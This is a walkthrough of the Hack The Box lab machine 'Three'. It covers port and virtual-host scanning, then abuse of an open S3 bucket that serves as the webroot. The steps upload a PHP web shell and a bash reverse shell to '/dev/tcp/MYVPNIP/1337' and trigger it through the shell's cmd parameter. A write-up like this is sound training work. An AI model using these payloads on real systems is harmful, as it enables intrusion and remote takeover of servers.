# Three
#startingpoint 
#veryeasy 
#web
#php
#aws

### Reconnaissance
The first step in any penetration test is to gather information about the target system. In this case, we are trying to identify open ports and services on the target host with the IP address 10.129.193.6. We use the `nmap -p- -sV $TARGET` command with the `-p-` option to scan all possible TCP ports and the `-sV` option to display service version information. The output shows that there are two open ports,  port 22 running ssh service and also port 80 running a Apache webserver.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-16 11:43 CET
Nmap scan report for 10.129.79.254
Host is up (0.055s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Exploring the website
Since we found an standard web open port, we try to enter the website. 
After performing a manual research on the website we can find a domain in the contacts part which is `thetoppers.htb`

We need to explore more information with this domain so we add it to /etc/hosts with the following command `echo "${TARGET} thetoppers.htb" | sudo tee -a /etc/hosts`

### Subdomain discover
One thing that we must try once we have a domain is search if there are any associated common subdomains, in order to do this we execute the following command

`gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/11/16 12:17:27 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]
                                                         
===============================================================
2023/11/16 12:17:51 Finished
===============================================================
```
We found a subdomain which returns a 404 error, so as we did before we add it to /etc/hosts, to do it we use this command `echo "${TARGET} s3.thetoppers.htb" | sudo tee -a /etc/hosts`
### AWS S3 website
As we did before we enter the new website, it says that is running so we do a little of research to find that we are working with a AWS S3, this is used as a storage service, in this particular case as a webserver. To interact with it we need to use the `aws` terminal tool, once we have the tool installed we need to setup it so we use the following command.

```
aws configure
AWS Access Key ID [None]: tmp
AWS Secret Access Key [None]: tmp
Default region name [None]: tmp
Default output format [None]: tmp
```
Once the aws cli is setup we can perform commands, first of all we want to know all the S3 endpoints so we run `aws --endpoint=http://s3.thetoppers.htb s3 ls`
```
2023-11-16 11:42:35 thetoppers.htb

```
It seems that there is only one endpoint so now we are going to explore this one, to do so we run `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
```
                          PRE images/
2023-11-16 11:42:35          0 .htaccess
2023-11-16 11:42:35      11952 index.php
```
We discover that the S3 is acting as the webroot, given this fact and the fact that we can do whatever we want to with the S3, we can upload a malicious code that let us run remote commands on the server. As the webserver is running .php we need to write the code in PHP, the following code allow us to run commands from the web url:

`<?php system($_GET["cmd"]); ?>`

Once written the code to a file `shell.php` we can upload it to the AWS S3 by running `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

To test it we can access the following url to test if we run commands as the webserver user, `http://thetoppers.htb/shell.php?cmd=id`

### Reverse shell

Now that we are allowed to run commands we are going to get a reverse shell on the server, to do this first we write the reverse shell code, it looks like this:
```
#!/bin/bash 
bash -i >& /dev/tcp/MYVPNIP/1337 0>&1
```

Once we have created the script we can upload it to the server as shown before, by running `aws --endpoint=http://s3.thetoppers.htb s3 cp reverseShell.sh s3://thetoppers.htb`

Now we need to start a listener in our machine, to do so execute `nc -nvlp 1337`

To start the reverse shell we can enter in the following url `http://thetoppers.htb/shell.php?cmd=cat%20reverseShell.sh|bash`

Once inside the reverse shell we can run the following commands to obtain the desired flag value
```
ls
cd ..
ls
cat flag.txt
```
After getting the flag we can finally clean our pentesting environment by removing the written scripts and deleting the new domains of /etc/hosts
